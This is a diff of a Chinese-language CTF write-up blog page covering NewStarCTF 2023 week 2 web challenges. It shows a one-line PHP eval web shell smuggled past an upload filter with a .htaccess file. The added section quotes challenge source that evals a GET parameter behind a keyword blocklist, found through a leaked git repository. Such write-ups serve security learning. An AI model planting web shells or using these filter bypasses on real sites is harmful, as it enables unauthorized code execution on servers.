@@ -36,8 +36,9 @@
 <meta property="og:image" content="https://ni0duann.github.io/images/NewStartCTF2023/Snipaste_2023-11-09_00-47-14.png">
 <meta property="og:image" content="https://ni0duann.github.io/images/NewStartCTF2023/Snipaste_2023-11-09_01-13-53.png">
 <meta property="og:image" content="https://ni0duann.github.io/images/NewStartCTF2023/Snipaste_2023-11-09_01-14-00.png">
+<meta property="og:image" content="https://ni0duann.github.io/images/NewStartCTF2023/Snipaste_2023-11-15_00-51-26.png">
 <meta property="article:published_time" content="2023-11-08T13:41:22.000Z">
-<meta property="article:modified_time" content="2023-11-08T17:24:28.067Z">
+<meta property="article:modified_time" content="2023-11-14T17:12:11.388Z">
 <meta property="article:author" content="Ni0duann">
 <meta property="article:tag" content="新生赛">
 <meta name="twitter:card" content="summary">
@@ -207,12 +208,14 @@
 <h1 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h1><p>上传png的马发现能被检测php<br>java script绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>上传.htaccess 和图片马<br><img src="/../images/NewStartCTF2023/Snipaste_2023-11-09_01-13-53.png" alt="Alt text"><br>蚁剑直出<br><img src="/../images/NewStartCTF2023/Snipaste_2023-11-09_01-14-00.png" alt="Alt text"></p>
-<h1 id="R-C-E-M-E"><a href="#R-C-E-M-E" class="headerlink" title="R!!C!!E!!M!!E!!"></a>R!!C!!E!!M!!E!!</h1><p>寄寄寄寄毫无头绪，直接看师傅的wp吧</p>
+<h1 id="R-C-E-M-E"><a href="#R-C-E-M-E" class="headerlink" title="R!!C!!E!!M!!E!!"></a>R!!C!!E!!M!!E!!</h1><p>看完了锅边糊师傅教学回来了<br>dirsearch扫出git泄露，<br>用kail搞一手githack拿到了bo0g1pop.php目录<br>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;</span><br><span class="line">    if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;</span><br><span class="line">        eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这匹配典型的无参rce<br><img src="/../images/NewStartCTF2023/Snipaste_2023-11-15_00-51-26.png" alt="Alt text"><br>执行的参数必须在host头下添加的而且必须得是x开头的，知识盲区，得去在深入学习一波</p>
 
             
         </div>
         <footer class="article-footer">
-            <a data-url="https://ni0duann.github.io/2023/11/08/NewStartCTF2023-week2-WEB-wp/" data-id="cloq15wmj0007ygg2g8ese51n" data-title="NewStartCTF2023_week2_WEB_wp"
+            <a data-url="https://ni0duann.github.io/2023/11/08/NewStartCTF2023-week2-WEB-wp/" data-id="cloyldf2m0003wgg2cmno41bi" data-title="NewStartCTF2023_week2_WEB_wp"
                class="article-share-link">分享</a>
             
             
@@ -383,10 +386,10 @@
             
                 <div>
                     <span class="icon-brush"></span>
-                    4k
+                    4.1k
                     &nbsp;|&nbsp;
                     <span class="icon-coffee"></span>
-                    00:18
+                    00:19
                 </div>
             
             
